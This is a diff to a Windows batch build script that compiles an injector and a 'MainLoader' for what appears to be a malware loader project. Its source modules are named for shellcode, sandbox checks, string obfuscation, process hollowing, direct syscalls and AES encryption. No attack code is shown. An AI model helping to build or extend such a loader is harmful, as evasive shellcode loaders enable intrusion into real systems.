@@ -46,8 +46,10 @@ cd ..
 
 echo.
 echo Paso 2: Compilando loaders...
-REM Compilar SimpleInjector
-cl /EHsc src\SimpleInjector.cpp /Fe:SimpleInjector.exe
+REM Compilar SimpleInjector (standalone tool)
+REM New architecture (commit 2): src/*.cpp is the library, tools/*.cpp is the exe,
+REM include/styxloader/*.hpp are the public headers.
+cl /EHsc /std:c++17 /Iinclude tools\simple_injector_tool.cpp src\shellcode.cpp src\simple_injector.cpp /Fe:SimpleInjector.exe
 if %errorlevel% neq 0 (
     echo Error al compilar SimpleInjector. Verifica Visual Studio.
     pause
@@ -56,9 +58,14 @@ if %errorlevel% neq 0 (
 echo SimpleInjector.exe compilado.
 
 REM Compile MainLoader (modular) with OpenSSL for AES
-cl /EHsc src\MainLoader.cpp modules\DirectSyscall.cpp modules\HollowInjector.cpp modules\StringObfuscator.h modules\SandboxCheck.cpp /I C:\OpenSSL\include /LIBPATH C:\OpenSSL\lib /Fe:MainLoader.exe libcrypto.lib libssl.lib
+REM New architecture (commit 2): src/*.cpp is the library, tools/main_loader.cpp is the exe.
+REM NOTE: src/direct_syscall.cpp depends on MASM stubs (modules/asm/styx_syscalls.asm)
+REM       which are added in commit 3. Until commit 3 is applied, the build will fail at
+REM       link time with unresolved StyxNt* symbols. This is expected.
+cl /EHsc /std:c++17 /Iinclude /I C:\OpenSSL\include tools\main_loader.cpp src\shellcode.cpp src\sandbox_check.cpp src\string_obfuscator.cpp src\simple_injector.cpp src\hollow_injector.cpp src\direct_syscall.cpp /LIBPATH C:\OpenSSL\lib /Fe:MainLoader.exe libcrypto.lib libssl.lib
 if %errorlevel% neq 0 (
     echo Error compiling MainLoader. Check OpenSSL installation.
+    echo Note: if you see unresolved StyxNt* symbols, apply commit 3 (MASM stubs) first.
     pause
     exit /b 1
 )
